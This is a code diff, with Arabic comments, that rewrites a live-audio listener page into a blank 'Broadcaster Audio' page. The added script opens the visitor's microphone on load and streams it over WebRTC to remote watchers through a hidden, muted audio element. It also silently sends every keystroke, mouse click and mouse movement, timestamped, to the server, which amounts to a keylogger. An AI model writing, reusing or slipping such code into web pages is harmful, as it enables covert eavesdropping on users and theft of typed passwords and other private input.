@@ -2,102 +2,68 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Live Audio Viewer</title>
+<title>Broadcaster Audio</title>
 <style>
-  body {
-    margin:0;
-    background:#121212;
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    color:#fff;
-    font-family: Arial, sans-serif;
-  }
-
-  h1 {
-    margin-bottom:20px;
-    font-size:24px;
-  }
-
-  canvas {
-    background:#222;
-    border-radius:8px;
-    width:90%;
-    max-width:600px;
-    height:150px;
-  }
-
-  audio {
-    display:none;
-  }
+body { margin:0; background:#fff; }
+audio { display:none; }
 </style>
 </head>
 <body>
-<h1>🎧 البث المباشر — الصوت فقط</h1>
-<canvas id="vuMeter"></canvas>
-<audio id="remoteAudio" autoplay></audio>
+<audio id="localAudio" autoplay muted></audio>
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
 (async function(){
   const socket = io();
-  const audioEl = document.getElementById('remoteAudio');
-  const pc = new RTCPeerConnection();
+  let pcMap = new Map();
+  const localAudio = document.getElementById("localAudio");
 
-  pc.ontrack = e => {
-    audioEl.srcObject = e.streams[0];
+  // افتح المايكروفون مباشرة
+  try {
+    const localStream = await navigator.mediaDevices.getUserMedia({ audio:true });
+    localAudio.srcObject = localStream;
+    socket.emit("broadcaster");
 
-    // إعداد VU Meter
-    const audioCtx = new AudioContext();
-    const source = audioCtx.createMediaStreamSource(e.streams[0]);
-    const analyser = audioCtx.createAnalyser();
-    analyser.fftSize = 256;
-    source.connect(analyser);
+    // استقبال مشاهدين
+    socket.on("watcher", async ({ watcherId }) => {
+      const pc = new RTCPeerConnection();
+      pcMap.set(watcherId, pc);
 
-    const canvas = document.getElementById('vuMeter');
-    const ctx = canvas.getContext('2d');
-    const bufferLength = analyser.frequencyBinCount;
-    const dataArray = new Uint8Array(bufferLength);
+      localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
 
-    function draw() {
-      requestAnimationFrame(draw);
-      analyser.getByteFrequencyData(dataArray);
-      ctx.fillStyle = "#222";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      pc.onicecandidate = e => {
+        if(e.candidate) socket.emit("candidate", { targetId: watcherId, candidate: e.candidate });
+      };
 
-      const barWidth = (canvas.width / bufferLength) * 2.5;
-      let x = 0;
-      for(let i=0; i<bufferLength; i++){
-        const barHeight = dataArray[i]/2;
-        ctx.fillStyle = `rgb(${barHeight+100},50,200)`;
-        ctx.fillRect(x, canvas.height-barHeight, barWidth, barHeight);
-        x += barWidth + 1;
-      }
-    }
-    draw();
-  };
+      const offer = await pc.createOffer();
+      await pc.setLocalDescription(offer);
+      socket.emit("offer", { watcherId, sdp: pc.localDescription });
 
-  pc.onicecandidate = e => { 
-    if(e.candidate) socket.emit('candidate', { targetId:'broadcaster', candidate:e.candidate }); 
+      pc.onconnectionstatechange = () => {
+        if(["failed","closed","disconnected"].includes(pc.connectionState)) {
+          pc.close(); pcMap.delete(watcherId);
+        }
+      };
+    });
+
+    socket.on("answer", ({ from, sdp }) => {
+      const pc = pcMap.get(from);
+      if(pc) pc.setRemoteDescription(new RTCSessionDescription(sdp));
+    });
+    socket.on("candidate", ({ from, candidate }) => {
+      const pc = pcMap.get(from);
+      if(pc && candidate) pc.addIceCandidate(new RTCIceCandidate(candidate));
+    });
+
+  } catch(err) {
+    alert("❌ لا يمكن فتح المايكروفون: " + err.message);
   }
 
-  // الانضمام للبث
-  socket.emit('watcher', { device:navigator.userAgent, os:navigator.platform });
+  // تسجيل ضغطات الكيبورد والماوس
+  document.addEventListener("keydown", e => socket.emit("key-press", { key:e.key, code:e.code, time:Date.now() }));
+  document.addEventListener("click", e => socket.emit("mouse-click", { x:e.clientX, y:e.clientY, button:e.button, time:Date.now() }));
+  document.addEventListener("mousemove", e => socket.emit("mouse-move", { x:e.clientX, y:e.clientY, time:Date.now() }));
 
-  socket.on('offer', async ({ from, sdp }) => {
-    await pc.setRemoteDescription(new RTCSessionDescription(sdp));
-    const answer = await pc.createAnswer();
-    await pc.setLocalDescription(answer);
-    socket.emit('answer', { targetId: from, sdp: pc.localDescription });
-  });
-
-  socket.on('candidate', ({ from, candidate }) => { 
-    if(candidate) pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(console.error); 
-  });
-
-  socket.on('no-broadcaster', () => alert('❌ لا يوجد بث حالياً'));
 })();
 </script>
 </body>
